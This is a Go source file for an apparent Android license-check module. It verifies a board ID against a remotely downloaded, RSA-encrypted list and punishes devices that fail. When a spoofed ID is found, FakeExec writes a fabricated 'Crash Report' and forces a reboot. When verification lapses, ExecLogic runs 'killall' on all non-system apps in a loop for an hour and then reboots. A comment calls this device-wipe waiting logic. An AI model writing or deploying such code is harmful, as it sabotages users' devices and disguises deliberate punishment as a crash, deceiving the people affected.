package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/gob"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/PPKunOfficial/VerixGo/Core"
	"github.com/PPKunOfficial/VerixGo/public"
)

func CheckOld() bool {
	var df [][]byte
	model := vLocal.Pmodel
	output := fmt.Sprintf("https://example.com/%s-%s.vf", model, panel.n)
	file, err := Core.DownloadFile(output)
	log.Info(output)
	if err != nil {
		log.Errorf("下载文件失败：%s", err)
	}

	reader := bytes.NewReader(file)
	dec := gob.NewDecoder(reader)
	err = dec.Decode(&df)
	if err != nil {
		log.Errorf("解码失败：%s", err)
		log.Errorf("文件内容:%s", file)
		return false
	}

	for _, v := range df {
		t, err := Core.RsaDecrypt(v, public.PrivateKey)
		if err != nil {
			log.Errorf("rsa解密出现错误：%s", err)
		}
		if bytes.Equal(t, []byte(vLocal.BoardID)) {
			vLocal.Verify = true
			vLocal.CheckTime = time.Now().Unix()
			gWriteAuto()
			return true
		}
	}
	return false
}

func FakeID() bool {

	text, err := Core.ReadLinesFromFile(fPath.boardIdPath)
	if err != nil {
		log.Error(err)
	}
	bid := text[0]

	f1, _ := os.Stat(fPath.chipNamePath)
	f2, _ := os.Stat(fPath.boardIdPath)
	r, _ := Core.ExecuteShellCommand("mount | grep -i serial_number")
	log.Infof("主板文件新旧对比:%s %s", f1.ModTime(), f2.ModTime())
	log.Infof("挂载表检测:%s", r)
	log.Infof("主板ID新旧对比:%s %s", bid, vLocal.BoardID)

	if Debug {
		return Debug
	}

	return (f1.ModTime().Unix() == f2.ModTime().Unix()) && (r == "") && (bid == vLocal.BoardID)
}
func FakeExec() {
	localF, err := os.OpenFile(fPath.logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Error(err)
	}
	defer func(localF *os.File) {
		_ = localF.Close()
	}(localF)
	content, err := json.Marshal(vLocal)
	if err != nil {
		log.Error(err)
	}
	logContent := append([]byte(fmt.Sprintf("---Crash Report--- "+
		"crash code: %v", crashCode())), content...)
	_, _ = localF.Write(logContent)
	rebootS()
}
func Joke() {
	// 验证主板id伪装
	fResult := FakeID()
	log.Infof("主板ID真假性测试:%v", fResult)
	if !fResult {
		log.Error("FAKE ID!")
		FakeExec()
	}
	if FirstInstall {
		time.Sleep(time.Duration(3600) * time.Second)
	}

	ExecLogic()

}

func ExecLogic() {
	// 格机等待逻辑
	// 假如没有验证
	if !vLocal.Verify {
		// 假如还有时间，就等待
		if time.Now().Unix()-vLocal.InstallTime < int64(wait) {
			/*
				检测安装时间并且与现在时间相减
				获取剩余的等待时长
				然后休眠等待时长
			*/
			log.Infof("距离安装时长:%v", time.Now().Unix()-vLocal.InstallTime)
			s := int64(wait) - (time.Now().Unix() - vLocal.InstallTime)
			time.Sleep(time.Duration(s) * time.Second)
		}
		// 等待后执行的操作
		// 获取当前时间并且关闭所有非系统软件
		// 使用 for 循环实现死循环
		// 当时间到达一小时后则继续往下执行
		startTime := time.Now().Unix()
		nonSystemApps, err := Core.GetNonSystemAppList()
		if err != nil {
			FakeExec()
		}
		for {
			for _, value := range nonSystemApps {
				_, err := Core.ExecuteShellCommand(fmt.Sprintf("killall %v", value))
				if err != nil {
					FakeExec()
				}
			}
			nowTime := time.Now().Unix()
			// 假如时间过去一个小时则退出
			if nowTime-startTime > 3600 {
				break
			}
			if vLocal.Verify {
				break
			}
		}

		// 假如过时仍然不验证，重启
		if !vLocal.Verify {
			FakeExec()
		}
	}
}

func rebootS() {
	fmt.Println("Reboot..")
	if !Debug {
		fmt.Println("Reboot..")
		_, err := Core.ExecuteShellCommand("reboot")
		if err != nil {
			fmt.Println(err)
		}
		_, err = Core.ExecuteShellCommand("setprop sys.powerctl reboot")
		if err != nil {
			fmt.Println(err)
		}
	}
}
func crashCode() string {
	// 获取当前时间
	t := time.Now()
	// 格式化为字符串
	s := t.Format("20060102150405")
	// 将字符串转换为字节切片
	b := []byte(s)
	// 创建一个sha1哈希器
	h := sha1.New()
	// 写入哈希器
	h.Write(b)
	// 获取哈希值
	hash := h.Sum(nil)
	// 转换为十六进制字符串
	hexStr := hex.EncodeToString(hash)
	// 转换为大写
	hexStr = strings.ToUpper(hexStr)
	// 打印结果
	return hexStr
}
